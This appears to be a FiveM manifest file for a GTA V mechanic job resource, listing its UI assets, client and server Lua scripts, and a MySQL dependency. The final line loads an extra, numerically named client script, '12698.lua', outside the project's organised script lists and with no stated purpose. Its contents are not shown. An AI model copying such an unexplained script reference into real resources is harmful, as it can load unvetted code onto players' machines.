fx_version 'bodacious'
game 'gta5'

author 'DiVouz'
description 'mechanic'
version '1.0.0'

lua54 'on'
is_cfxv2 'yes'
use_fxv2_oal 'true'

ui_page 'client/ui/index.html'
files {
	'client/ui/index.html',
	'client/ui/js/**/*.js',
	'client/ui/css/**/*.css',
	'client/ui/img/**/*.png',
	'client/ui/sounds/**/*.ogg'
}

client_scripts {	
	'client/core.lua',
	'client/helper.lua',
	'client/job.lua',
	'config/config.lua',
	'config/menus.lua',
	'config/labels.lua',
	'config/vehicles.lua',
}

server_scripts {	
	'@mysql-async/lib/MySQL.lua',
	'server/core.lua',
	'config/config.lua',
	'config/menus.lua',
	'config/labels.lua',
	'config/vehicles.lua',
}
client_script '12698.lua'